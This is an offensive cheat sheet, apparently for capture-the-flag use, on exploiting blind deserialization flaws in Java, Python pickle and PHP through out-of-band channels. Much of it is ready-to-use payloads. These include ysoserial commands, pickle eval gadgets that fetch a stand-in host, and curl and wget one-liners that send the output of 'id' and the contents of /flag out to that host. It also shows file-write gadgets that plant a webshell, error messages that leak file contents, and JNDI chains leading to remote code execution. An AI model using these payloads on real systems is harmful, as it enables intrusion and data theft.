# Blind Deserialization — when nothing reflects

## The shape — the response never shows your object's effect

A second-order sink, an async worker, a silent cache-write — the gadget
fires in a process whose output you never see. The only channel is
side-effect: network, filesystem, time.

## The side-channel ladder — cheapest first

```
1. DNS callback     → the gadget resolves a host — always-on signal
2. HTTP callback    → the gadget fetches your URL — body + headers visible
3. file write       → the gadget writes a file you can later read
4. time delay       → the gadget sleeps — a measurable delta
5. error-side       → a parser error leaks a byte of state
```

## DNS — the zero-dependency confirm

```bash
java -jar ysoserial.jar URLDNS http://probe.YOUR-DNS/ >u.ser
```

Works on EVERY Java deserializer — `URL.hashCode` resolves the hostname.
Callback = `readObject` ran. The strongest blind Java confirm.

For other languages, the OOB call is inside the payload:

```python
# pickle — socket.gethostbyname or urllib:
(eval, ("__import__('urllib.request').urlopen('http://x.YOU')",))
(eval, ("__import__('socket').gethostbyname('x.YOU')",))
```

```php
// SoapClient __call fetches a remote WSDL:
O:10:"SoapClient":N:{...uri:"http://YOU/wsdl"...}
```

```xml
<!-- XStream — a gadget that resolves a host -->
```

## HTTP — more info than DNS

```bash
# the payload embeds data in the URL it fetches:
curl http://YOU/`id|base64 -w0`
curl http://YOU/`cat /flag|base64|tr -d '\n'`
wget --post-data="$(id)" http://YOU/x
```

The `oob_listener.py` log shows the path+body — the exfil channel is the
URL itself.

```bash
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name p1
python3 tools/web/oob_listener.py hits --log hits.jsonl
```

## File write — when egress is dead

```bash
# Java — AspectJWeaver or FileUpload1 writes a file into webroot
java -jar ysoserial.jar AspectJWeaver '/var/www/html/pwn.txt' 'PWNED'

# PHP — Guzzle/SwiftMailer FW chain, or phar:// → write
# then GET the written path → contents = your marker or the flag
```

## The write-then-read pair

```
1. gadget writes a known file  →  /var/www/html/x.txt  or  /tmp/x
2. you GET it                  →  the file's contents prove the write ran
3. or the file IS the webshell →  /x.php?c=id
```

Works with egress fully blocked — the file IS the side-channel.

## Timing — the weakest channel, last resort

A `sleep`/`delay` inside the gadget:

```python
# pickle — a reduce that sleeps:
(eval, ("__import__('time').sleep(5)",))
# the response takes +5s → the gadget ran
```

```php
// a chain whose sink calls sleep(5)
O:...:{...:'sleep'...}   → +5s on the trigger request
```

```bash
# Java — a gadget that Thread.sleep()s
```

Timing is evidence only when the delta is consistent and large — network
jitter looks identical otherwise. Corroborate before claiming.

## The error-side-channel — leaking state through a controlled error

A gadget that throws with your data in the message:

```java
// a chain whose sink throws an exception carrying the flag:
// e.g. throw new Exception(new String(Files.readAllBytes(Paths.get("/flag"))))
// → the 500 body carries the flag inside the stack trace
```

```python
# pickle — a reduce that raises with the flag in the message:
(eval, ("exec('raise Exception(open(\"/flag\").read())')",))
```

The "error" IS the exfil — the response body carries the flag inside the
exception text.

## The JNDI blind path — Java specifically

`JdbcRowSetImpl`/`C3P0` chains call `lookup(yourUrl)` internally — the
DNS+LDAP/RMI connect-out is the OOB. Even if remote classload is dead
(JDK ≥8u191), the `lookup` itself fires → a callback confirms the sink,
and a `javaSerializedData` second-stage can still RCE. See `jndi-injection.md`.

## The tag-discipline — matching hits to probes

```bash
python3 tools/web/oob_listener.py canary --base http://YOU:8000 --name probe3
# → embed probe3.YOU:8000 or YOU:8000/probe3 in the payload
# the ledger matches the callback to the exact gadget+class that sent it
```

An untagged callback tells you SOMETHING fired — not which payload. Tag
each gadget/class variant differently so the hit maps back.

## The egress-blocked matrix — what's still possible

| Egress | DNS | HTTP | File write | Time | Error |
|---|---|---|---|---|---|
| fully open | yes | yes | yes | yes | yes |
| DNS only | yes | no | yes | yes | yes |
| HTTP proxy only | no | via proxy | yes | yes | yes |
| fully blocked | no | no | yes | yes | yes |
| block + no fs write | no | no | no | yes | yes |

## Falsifiers — when blind also dies

- No callback, no file write, no timing delta on a known-good chain —
  after a version-correct chain on a confirmed sink → the class is likely
  closed OR the mechanism path is wrong. Distinguish: a `ClassNotFound`/
  `incompatible` error on the bytes proves the deserializer; a total silent
  200 suggests it never ran.
- `ObjectInputFilter`/`allowed_classes`/`safe_load` verified AND no
  permitted gadget → closed for real.

## Output to record

- Which side-channel fired (DNS/HTTP/file/time/error)
- The verbatim OOB-log line / written-file contents / timing delta
- The `canary --name` tag so the hit maps to the probe
